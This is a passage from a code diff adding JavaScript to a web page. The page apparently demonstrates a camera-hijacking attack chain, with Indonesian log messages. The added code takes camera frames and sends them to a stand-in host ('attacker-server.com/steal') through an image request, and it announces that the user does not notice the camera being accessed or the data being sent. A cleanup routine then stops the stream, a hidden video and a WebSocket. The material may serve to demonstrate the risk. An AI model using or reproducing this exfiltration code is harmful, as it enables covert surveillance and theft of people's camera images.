+                                                img.src = 'https://attacker-server.com/steal?data=' + 
+                                                    encodeURIComponent(data.slice(0, 100));
+
+                                                log('Step 6: 📤 DATA DIEXFILTRASI ke server C2!', 'error');
+                                                log('⚠ FULL ATTACK CHAIN BERHASIL — tanpa sepengetahuan user!', 'error');
+
+                                                attackLog.innerHTML = `
+                                                    <p class="error">🔥 FULL ATTACK CHAIN BERHASIL!</p>
+                                                    <p class="error">⚠ User tidak sadar kamera diakses & data dikirim ke attacker</p>
+                                                    <div class="exfil-data">
+                                                        <strong>Exfiltrated data (JPEG):</strong><br>
+                                                        ${data.slice(0, 150)}...
+                                                    </div>
+                                                `;
+
+                                                stream.getTracks().forEach(t => t.stop());
+                                            }, 2000);
+                                        })
+                                        .catch(e => {
+                                            log(`❌ Akses gagal: ${e.message}`, 'error');
+                                        });
+                                }, 1000);
+                            } else {
+                                log('Step 3: Permission belum granted — attack membutuhkan user grant sekali.', 'warn');
+                            }
+                        });
+                    }
+                });
+            }, 500);
+
+            updateStat('statStatus', 'ATTACKING');
+        }
+
+        // =========================================================
+        // Stop Everything
+        // =========================================================
+        function stopAll() {
+            // Stop stream
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(t => t.stop());
+                mediaStream = null;
+            }
+
+            // Stop hidden video
+            hiddenVideo.srcObject = null;
+
+            // Clear intervals
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+
+            // Stop WebSocket
+            if (ws) {
+                ws.close();
+                ws = null;
+            }
+
+            // Reset UI
+            preview.style.display = 'none';
+            preview.srcObject = null;
+            document.getElementById('cameraInfo').innerHTML = '';
+            document.getElementById('iframeContainer').innerHTML = '';
+            capturedFrames = [];
+
+            updateStat('statStatus', 'STOPPED');
+            log('⏹ Semua aktivitas dihentikan & cleanup.', 'info');
         }
     </script>
-
 </body>
 </html>
